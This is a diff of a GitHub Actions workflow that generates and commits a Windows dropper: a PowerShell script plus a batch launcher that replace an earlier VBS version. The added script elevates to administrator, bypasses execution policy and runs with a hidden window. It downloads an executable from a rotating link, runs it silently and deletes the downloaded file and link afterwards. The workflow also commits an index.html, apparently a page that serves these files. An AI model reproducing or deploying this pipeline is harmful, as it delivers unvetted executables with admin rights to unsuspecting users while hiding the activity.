@@ -25,66 +25,43 @@ jobs:
         
         echo "Using link: $current_link"
         
-        # Create a VBS script that handles elevation
-        cat > installer.vbs << 'EOF'
-        ' Check if running with elevated privileges
-        If Not WScript.Arguments.Named.Exists("elevated") Then
-            ' Restart with elevation
-            CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
-            WScript.Quit
-        End If
+        # Create a PowerShell script instead of VBS
+        cat > installer.ps1 << 'EOF'
+        # Check if running with elevated privileges
+        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+            # Restart with elevation
+            Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+            exit
+        }
         
-        ' Main installation code
-        Dim objShell, objFSO, urlFile, installerPath, downloadUrl, objHTTP, objStream
+        # Read URL from file
+        $tempPath = $env:TEMP
+        $urlFile = "$tempPath\download_url.txt"
+        $installerPath = "$tempPath\installer.exe"
         
-        Set objShell = CreateObject("WScript.Shell")
-        Set objFSO = CreateObject("Scripting.FileSystemObject")
+        $downloadUrl = Get-Content $urlFile
         
-        ' Read URL from file
-        tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
-        urlFile = tempPath & "\download_url.txt"
-        installerPath = tempPath & "\installer.exe"
-        
-        Set objFile = objFSO.OpenTextFile(urlFile, 1)
-        downloadUrl = objFile.ReadAll
-        objFile.Close
-        
-        ' Download file with proper error handling
-        On Error Resume Next
-        Set objHTTP = CreateObject("MSXML2.XMLHTTP")
-        objHTTP.Open "GET", downloadUrl, False
-        objHTTP.Send
-        
-        ' Handle redirects
-        If objHTTP.Status >= 300 And objHTTP.Status < 400 Then
-            finalUrl = objHTTP.getResponseHeader("Location")
-            objHTTP.Open "GET", finalUrl, False
-            objHTTP.Send
-        End If
-        
-        ' Save file
-        If objHTTP.Status = 200 Then
-            Set objStream = CreateObject("ADODB.Stream")
-            objStream.Type = 1
-            objStream.Open
-            objStream.Write objHTTP.ResponseBody
-            objStream.SaveToFile installerPath, 2
-            objStream.Close
+        # Download using Invoke-WebRequest (more reliable than XMLHTTP)
+        try {
+            Invoke-WebRequest -Uri $downloadUrl -OutFile $installerPath -UseBasicParsing
             
-            ' Run installer silently with admin privileges
-            objShell.Run """" & installerPath & """ /S", 0, True
+            # Run installer silently
+            Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait
             
-            ' Clean up
-            objFSO.DeleteFile installerPath, True
-            objFSO.DeleteFile urlFile, True
-        End If
+            # Clean up
+            Remove-Item $installerPath -Force
+            Remove-Item $urlFile -Force
+        } catch {
+            # Log error to temp file
+            "Error: $_" | Out-File "$tempPath\install_error.txt"
+        }
         EOF
         
-        # Create batch file that copies URL and runs VBS
+        # Create batch file that copies URL and runs PowerShell
         cat > run.bat << 'EOF'
         @echo off
         copy "%~dp0url.txt" "%TEMP%\download_url.txt" >nul
-        cscript.exe //nologo "%~dp0installer.vbs"
+        powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0installer.ps1"
         EOF
         
         # Create URL file
@@ -96,6 +73,6 @@ jobs:
         # Commit and push
         git config --global user.email "action@github.com"
         git config --global user.name "GitHub Action"
-        git add installer.vbs run.bat url.txt index.html
+        git add installer.ps1 run.bat url.txt index.html
         git commit -m "Update installer" || exit 0
         git push
